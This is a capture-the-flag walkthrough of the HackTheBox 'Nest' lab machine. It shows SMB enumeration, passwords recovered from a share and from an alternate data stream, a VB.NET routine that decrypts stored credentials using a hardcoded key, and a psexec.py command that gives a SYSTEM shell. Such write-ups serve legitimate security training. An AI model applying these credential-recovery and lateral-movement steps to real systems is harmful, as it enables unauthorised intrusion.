1,Recon
Port scan 
	445/tcp SMB
	4386/tcp unknown `Reporting Service V1.2`

Smb service:
```
smbclient -N -L //10.10.10.178     

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.178 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

Of course we can try /Data and /Users

smbclient -N //10.10.10.178/users
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Administrator\*
NT_STATUS_ACCESS_DENIED listing \C.Smith\*
NT_STATUS_ACCESS_DENIED listing \L.Frost\*
NT_STATUS_ACCESS_DENIED listing \R.Thompson\*
NT_STATUS_ACCESS_DENIED listing \TempUser\*

smbclient -N //10.10.10.178/data
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \IT\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Reports\*
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (6.9 KiloBytes/sec) (average 4.3 KiloBytes/sec)

Maintenance Alerts.txt

There is currently no scheduled maintenance work

Welcome Email.txt

We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```
Then we can get a credit of `TempUser`.

Port 4386:
By searching `Reporting Service V1.2`, we can get `CVE-2020-0618: RCE in SQL Server Reporting Services (SSRS)`
`https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/`

And we can also use netcat to check it
```
nc 10.10.10.178 4386                                                     

HQK Reporting Service V1.2

```
Since I saw that nmap was able to get at least a help menu out of the program, I tried connecting with telnet, and it worked:

```
telnet 10.10.10.178 4386  
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
>
```

Now I can access one more share, Secure$:
```
smbmap -H 10.10.10.178 -u TempUser -p welcome2019
[+] IP: 10.10.10.178:445        Name: 10.10.10.178              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 READ ONLY
        Users                                                   READ ONLY                              
```
Then we can login to them
`smbclient -U TempUser //10.10.10.178/Secure$ welcome2019`
`smbclient -U TempUser //10.10.10.178/Users welcome2019`
`smbclient -U TempUser //10.10.10.178/Data welcome2019`

After enumerating the files, we find the credit from `file:///home/wither/Templates/htb-labs/Nest/IT/Configs/RU%20Scanner/RU_config.xml`
```
<ConfigFile>
<Port>389</Port>
<Username>c.smith</Username>
<Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```
Let's try to crack the password firstly and check it to login the SMB or evil-winrm.
But it would be not worked so we need to continue enumerating.
From `file:///home/wither/Templates/htb-labs/Nest/IT/Configs/NotepadPlusPlus/config.xml`

```
<History nbMaxFile="15" inSubMenu="no" customLength="-1">
<File filename="C:\windows\System32\drivers\etc\hosts"/>
<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt"/>
<File filename="C:\Users\C.Smith\Desktop\todo.txt"/>
</History>
```

In this place, I can't access to `\Secure$`, but I can access to `\Secure$\Carl`
```
smbclient -U TempUser //10.10.10.178/Secure$ welcome2019
Try "help" to get a list of possible commands.
smb: \> cd IT\Carl
smb: \IT\Carl\> ls
  .                                   D        0  Wed Aug  7 15:42:14 2019
  ..                                  D        0  Wed Aug  7 15:42:14 2019
  Docs                                D        0  Wed Aug  7 15:44:00 2019
  Reports                             D        0  Tue Aug  6 09:45:40 2019
  VB Projects                         D        0  Tue Aug  6 10:41:55 2019

                10485247 blocks of size 4096. 6545797 blocks available
```

Code Analysis

The collected code is a .NET VB project. The main Visual Studio project file is RUScanner.sln:
```
ls 'VB Projects/WIP/RU/'
RUScanner  RUScanner.sln
```
Looking through the code, one of the things that jumps out to me is Utils.vb. It’s a class that’s designed to provide EncryptString and DecryptString functions to the rest of the project. I see this called from the main code in Module1.vb1:
```
Module Module1
    
  Sub Main()
    Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
    Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}

  End Sub

End Module
```
It is opening a RU_Config.xml file, and then reading the username and decrypting the password. That matches what I found above for C.Smith.


Visual Studio
Installing VS is a pain, and it takes a long time, but it’s worth having installed and setup in your Windows VM. There are many Windows-focused projects out there that don’t provide compiled binaries. Once you have VS set up, you can download a project and build it.

In this case, I’ll open the .sln file in VS:
![](images/Pasted%20image%2020240920063706.png)

Before changing anything, it’s always a good idea to make sure the project will build. First I’ll change it from Debug to Release and x86 to x64 in the drop-downs at the top, and then from the menu, I’ll select Build -> Build Solution.
![](images/Pasted%20image%2020240920063725.png)

This binary doesn’t do anything except for read a config into another variable and then exit. If I try to run it, it throws errors because it can’t find the config file:
```
.\DbPof.exe

Unhandled Exception: System.IO.FileNotFoundException: Could not find file 'Z:\nest-10.10.10.178\files\VB Projects\WIP\RU\RUScanner\bin\x64\Release\RU_Config.xml'.
   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
   at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy)
   at System.IO.FileStream..ctor(String path, FileMode mode)
   at DbPof.ConfigFile.LoadFromFile(String FilePath) in Z:\nest-10.10.10.178\files\VB Projects\WIP\RU\RUScanner\ConfigFIle.vb:line 15
   at DbPof.Module1.Main() in Z:\nest-10.10.10.178\files\VB Projects\WIP\RU\RUScanner\Module1.vb:line 4
```

If I copy a copy of the config file into the same directory, now it runs and exits without outputting anything.

I see two ways to approach this. Since it’s .NET, I can open it in dnspy. It will show up on the left, and if I expand enough, I’ll find Module 1:
![](images/Pasted%20image%2020240920063902.png)
Clicking on it, I’ll see the code from Main(). I’ll right click on the last line, and add a break point:
![](images/Pasted%20image%2020240920064000.png)
Now I’ll hit Start. It runs to the break point and stops. In the bottom window, I can see all the variables in memory:
![](images/Pasted%20image%2020240920064013.png)
I’ll hit Step Over once, and it moves past the current line. Now the decrypted password is there:
![](images/Pasted%20image%2020240920064030.png)
The other way to quickly get the password is to add a line to Main():
```
Module Module1

    Sub Main()
        Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
        Console.WriteLine(Utils.DecryptString(Config.Password))

    End Sub

End Module
```
I could also comment out the other two. Or put a static string in instead of Config.Password. Now I’ll build again, and run:
```
.\DbPof.exe
xRxRxPANCAK3SxRxRx
```

Web IDE Path
The quick way to recover the password is to put this code into an online VB environment like dotnetfiddle. When I first visit and select VB.NET as the language, it gives some Hello World code:
`https://dotnetfiddle.net/`
```
Imports System
				
Public Module Module1
	Public Sub Main()
		Console.WriteLine("Hello World")
	End Sub
End Module
```

I can run it, and it prints “Hello World” in the console at the bottom:
![](images/Pasted%20image%2020240920064958.png)

I’ll jam my own code in here. I’ll replace "Hello World" with `DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")`. Now I’ll add the `DecryptString` and `Decrypt` functions with very little modification. I needed to remove the keyword “Shared” from the function declarations:
![](images/Pasted%20image%2020240920065133.png)
My resulting code is:
```
Imports System
Imports System.Text
Imports System.Security.Cryptography

Public Module Module1
  Public Sub Main()
    Console.WriteLine(DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="))
  End Sub

  Public Function DecryptString(EncryptedString As String) As String
    If String.IsNullOrEmpty(EncryptedString) Then
      Return String.Empty
    Else
      Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
    End If
  End Function

  Public Function Decrypt(ByVal cipherText As String, _
                          ByVal passPhrase As String, _
                          ByVal saltValue As String, _
                          ByVal passwordIterations As Integer, _
                          ByVal initVector As String, _
                          ByVal keySize As Integer) _
                          As String

    Dim initVectorBytes As Byte()
    initVectorBytes = Encoding.ASCII.GetBytes(initVector)

    Dim saltValueBytes As Byte()
    saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

    Dim cipherTextBytes As Byte()
    cipherTextBytes = Convert.FromBase64String(cipherText)

    Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                       saltValueBytes, _
                                       passwordIterations)

    Dim keyBytes As Byte()
    keyBytes = password.GetBytes(CInt(keySize / 8))

    Dim symmetricKey As New AesCryptoServiceProvider
    symmetricKey.Mode = CipherMode.CBC

    Dim decryptor As ICryptoTransform
    decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

    Dim memoryStream As IO.MemoryStream
    memoryStream = New IO.MemoryStream(cipherTextBytes)

    Dim cryptoStream As CryptoStream
    cryptoStream = New CryptoStream(memoryStream, _
                                    decryptor, _
                                    CryptoStreamMode.Read)

    Dim plainTextBytes As Byte()
    ReDim plainTextBytes(cipherTextBytes.Length)

    Dim decryptedByteCount As Integer
    decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                           0, _
                                           plainTextBytes.Length)

    memoryStream.Close()
    cryptoStream.Close()

    Dim plainText As String
    plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                        0, _
                                        decryptedByteCount)

    Return plainText
  End Function

End Module
```
When it runs, it prints: `xRxRxPANCAK3SxRxRx`.

SMB Access
The password does work for SMB for C.Smith, but doesn’t give admin or code exec (no (Pwn3d!) message):
```
crackmapexec smb 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRx
SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\C.Smith:xRxRxPANCAK3SxRxRx 
```

C.Smith has access to the same three shares:
```
smbmap -H 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRx
[+] IP: 10.10.10.178:445        Name: 10.10.10.178                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 READ ONLY
        Users                                                   READ ONLY
```

I can now access the C.Smith directory in \\10.10.10.178\Users, and there’s user.txt.
```
smbclient -U C.Smith //10.10.10.178/users xRxRxPANCAK3SxRxRx
Try "help" to get a list of possible commands.
smb: \C.Smith\> dir
  .                                   D        0  Sun Jan 26 02:21:44 2020
  ..                                  D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 19:06:17 2019
  user.txt                            A       32  Thu Aug  8 19:05:24 2019
```

3,Shell as SYSTEM
Also in C.Smith’s directory in the share is the HQK Reporting folder. That matches the service I identified on port 4386 in initial recon. I’ll recurrsively pull back all the files, and there are three:
```
find HQK\ Reporting/ -type f -ls

     6603      0 -rwxrwx---   1 root     vboxsf          0 Jun  5 15:52 HQK\ Reporting/Debug\ Mode\ Password.txt
     6604      4 -rwxrwx---   1 root     vboxsf        249 Jun  5 15:52 HQK\ Reporting/HQK_Config_Backup.xml
     6602     20 -rwxrwx---   1 root     vboxsf      17408 Jun  5 15:52 HQK\ Reporting/AD\ Integration\ Module/HqkLdap.exe
```

The backup config confirms the port and the directory that the user starts in once they connect:
```
<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>
```

I’m particularly drawn to Debug Mode Password.txt, except that it came back as zero bytes. Interestingly, it reports to be zero bytes on the share as well:
```
smb: \C.Smith\> cd "HQK Reporting"
smb: \C.Smith\HQK Reporting\> dir
  .                                   D        0  Thu Aug  8 19:06:17 2019
  ..                                  D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019

                10485247 blocks of size 4096. 6545781 blocks available

```

However, if I run allinfo on it, I can see something else:
```
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
```

There’s an alternative data stream (ADS) there.I can get it with smbclient just by specifying the entire stream name with a get:

```
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```
Locally, I can get the password:
`WBQ201953D8w`

Revisiting HQK Reporting
I’ll connect again to HQK (using rlwrap to get arrow keys), and enter the debug creds. They work, and new commands are unlocked:
```
rlwrap telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

> debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
> help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>
```

RUNQUERY still does nothing, but the new command SHOWQUERY seems to print the content of the file:
```
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>runquery 1

Invalid database configuration found. Please contact your system administrator

>showquery 1

TITLE=Invoices (Ordered By Customer)
QUERY_MODE=VIEW
QUERY_TYPE=INVOICE
SORTBY=CUSTOMER
DATERANGE=ALL
```

One directory up, there’s the executable and some config files for the program:
```
SETDIR ../

>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
```

HQK_Config.xml is the same as I pulled off SMB. In the LDAP directory, there’s a config file and another executable:
```
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: ldap
```

The .conf file looks like another example with an encrypted password:
```
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

```
file HqkLdap.exe                                                        
HqkLdap.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 4 sections
```
Based on the file names and the directory names, my thinking is that somehow this developer is trying to tie this application that doesn’t quite work yet into Active Directory, and may need (or at least be using) the administrator password to do that.

I’ll head back to my Windows VM, open dnSpy-x86 and load HqkLdap.exe. Just like last time, I’ll find Main():

![](images/Pasted%20image%2020240920075157.png)

The source starts off as:
```
public static void Main()
{
  checked
  { 
    try
    {
      if (MyProject.Application.CommandLineArgs.Count != 1) 
      {
        Console.WriteLine("Invalid number of command line arguments");
      }
      else if (!File.Exists(MyProject.Application.CommandLineArgs[0]))
      {
        Console.WriteLine("Specified config file does not exist");
      }
      else if (!File.Exists("HqkDbImport.exe"))
      {
        Console.WriteLine("Please ensure the optional database import module is installed");
      }
```

First, there are three conditions that are required to run:

There’s one command line argument.
The config file specified as the command line argument exists.
HqkDbImport.exe exists.
This last one could be challenging, but it is called after the part of the code I care about, so it’s not important. I’ll create the two files in the same directory:
![](images/Pasted%20image%2020240920075239.png)
After those checks, it loads the config file:
```
 else
      {
        LdapSearchSettings ldapSearchSettings = new LdapSearchSettings();
        string[] array = File.ReadAllLines(MyProject.Application.CommandLineArgs[0]);
        foreach (string text in array)
        {
          if (text.StartsWith("Domain=", StringComparison.CurrentCultureIgnoreCase))
          {
            ldapSearchSettings.Domain = text.Substring(text.IndexOf('=') + 1);
          }
          else if (text.StartsWith("User=", StringComparison.CurrentCultureIgnoreCase))
          {
            ldapSearchSettings.Username = text.Substring(text.IndexOf('=') + 1);
          }
          else if (text.StartsWith("Password=", StringComparison.CurrentCultureIgnoreCase))
          {
            ldapSearchSettings.Password = CR.DS(text.Substring(text.IndexOf('=') + 1));
          }
        }
```

I’ll put a break point on the next line after the password is decrypted and set. I’ll select Debug -> Start Debugging…, and add ldap.conf as an argument:
![](images/Pasted%20image%2020240920075312.png)

On hitting OK, it runs to my break point, and I can see the decrypted password:
![](images/Pasted%20image%2020240920075333.png)
Then we get the Password : `XtH4nkS4Pl4y1nGX`

In this place, The RD() method then decrypts the string and returns the plaintext. A quick comparison
between this method and one found in Utils.vb proves that they are the same. This means we
can re-use the code from earlier and just change the parameters.


Then we can use `psexec.py` to get the SYSTEM shell:
`python3 /opt/impacket/examples/psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178`
